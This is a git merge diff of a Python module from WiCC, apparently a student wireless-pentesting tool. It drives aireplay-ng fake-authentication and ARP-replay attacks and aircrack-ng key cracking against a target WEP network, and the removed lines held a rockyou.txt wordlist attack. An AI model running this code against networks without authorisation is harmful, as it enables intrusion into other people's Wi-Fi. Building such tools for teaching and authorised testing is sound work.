c41de40ec65a24773ad557e6d77a079c2081a685
MiguelYanes <miguelyanes@hotmail.es>
2019-05-19 11:33:33 +0100

    Merge branch 'development' of /home/pentest/PycharmProjects/WiCC with conflicts.

--- wicc_wep.py
+++ wicc_wep.py
@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-    WiCC (Wifi Cracking Camp)
-    GUI tool for wireless pentesting on WEP and WPA/WPA2 networks.
-    Project developed by Pablo Sanz Alguacil, Miguel Yanes Fernández and Adan Chalkley,
-    as the Group Project for the 3rd year of the Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity
-    at TU Dublin - Blanchardstown Campus
+    WiCC (Wireless Cracking Camp)
+    GUI tool for wireless cracking on WEP and WPA/WPA2 networks.
+    Project developed by Pablo Sanz Alguacil and Miguel Yanes Fernández, as the Group Project for the 3rd year of the
+    Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity, at TU Dublin - Blanchardstown Campus
 """
 
 from wicc_enc_type import EncryptionType
@@ -21,20 +20,18 @@ class WEP(EncryptionType):
         :param interface: selected wireless interface
         :param mac: attacker mac address
         :param verbose_level: verbose level set by main
-        :param silent_attack: option to do a silent scan
-        :param write_directory: directory to write the generated files
 
         :Author: Miguel Yanes Fernández
         """
         EncryptionType.__init__(self, network, interface, verbose_level, silent_attack, write_directory)
+        # super().__init__(self, network, interface)
         self.mac = mac
-        self.running_with_wordlist = False
-        self.running_aircrack = False
 
     def scan_network(self):
         """
         Method to scan the target network. With the selected attacker's mac, makes a fake authentication to the network
-        to then send arp responses to generate data (if it's not in silent mode).
+        to then send arp responses to generate data.
+        :param write_directory: directory to write the scan files
         :return: none
 
         :Author: Miguel Yanes Fernández
@@ -42,7 +39,7 @@ class WEP(EncryptionType):
         super(WEP, self).scan_network()
 
         if not self.silent_attack:
-            self.execute_command(['rm', self.write_directory + '/qreplay*'])
+            self.execute_command(['rm', 'replay*'])
             fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-b', self.bssid, '-e', self.essid, '-T', '3',
                             self.interface, '-h', self.mac]
             arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
@@ -67,12 +64,11 @@ class WEP(EncryptionType):
         pgrep_aireplay_cmd = ['pgrep', 'aireplay']
 
         while self.password == "":
-            if not self.running_aircrack:
-                crack_thread = threading.Thread(target=self.crack_network)
-                crack_thread.start()
-            time.sleep(1)
+            crack_thread = threading.Thread(target=self.crack_network)
+            crack_thread.start()
+            time.sleep(10)
             if not self.silent_attack and self.password == "":
-                if counter == 20:
+                if counter == 2:
                     self.show_message("Reseting aireplay every 20 seconds . . .")
                     pgrep_out, err = self.execute_command(pgrep_aireplay_cmd)
 
@@ -91,11 +87,6 @@ class WEP(EncryptionType):
                     arpreplay_thread.start()
                     arpreplay_thread.join(0)
                     self.show_message("Running aireplay thread on mac: " + self.mac)
-
-                    if not self.running_with_wordlist:
-                        aircrack_wordlist_thread = threading.Thread(target=self.aircrack_wordlist)
-                        aircrack_wordlist_thread.start()
-
                     counter = 0
                 else:
                     counter+=1
@@ -108,52 +99,11 @@ class WEP(EncryptionType):
 
         :Author: Miguel Yanes Fernández
         """
-        self.running_aircrack = True
-        self.execute_command(['rm', self.write_directory + '/aircrack_out_' + str(self.timestamp)])
-        self.execute_command(['touch', self.write_directory + '/aircrack_out_' + str(self.timestamp)])
+        password = ""
         aircrack_cmd = ['timeout', '10', 'aircrack-ng',
-                        self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
-                        '>', self.write_directory + '/aircrack_out_' + str(self.timestamp)]
+                        self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap']
         self.show_message("Running aircrack thread")
-        self.execute_command(aircrack_cmd)
-        time.sleep(1)
-        print("executed aircrack")
-        with open(self.write_directory + '/aircrack_out_' + str(self.timestamp), 'r') as file:
-            password = self.filter_aircrack(file.read())
-
-        self.running_aircrack = False
-
-        self.password = password
-
-    def aircrack_wordlist(self):
-        """
-        Cracks the capture file with the selected wordlist
-        :return: password key (if found in the wordlist)
-
-        :Author: Miguel Yanes Fernández
-        """
-        self.show_message("running with wordlist")
-        self.running_with_wordlist = True
-        aircrack_wordlist_cmd = ['aircrack-ng', self.write_directory + '/net_attack_' + str(self.timestamp) + '-01.cap',
-                                 '-w', '/usr/share/wordlists/rockyou.txt']
-        out, err = self.execute_command(aircrack_wordlist_cmd)
-        self.show_message("\n\tFinished with wordlist")
+        out, err = self.execute_command(aircrack_cmd)
         password = self.filter_aircrack(out.decode("utf-8"))
+
         self.password = password
-
-        self.running_with_wordlist = False
-
-    def filter_aircrack(self, output):
-        """
-        Filter the aircrack output to read the password (if any is found)
-        :param output: output from the aicrack command
-        :return: password (or "" if it wasn't found)
-
-        :Author: Miguel Yanes Fernández
-        """
-        words = output.split(" ")
-        for i in range(0, len(words)):
-            if words[i] == "(ASCII:":
-                return words[i+1]
-        self.show_message("No password found in the capture file")
-        return ""
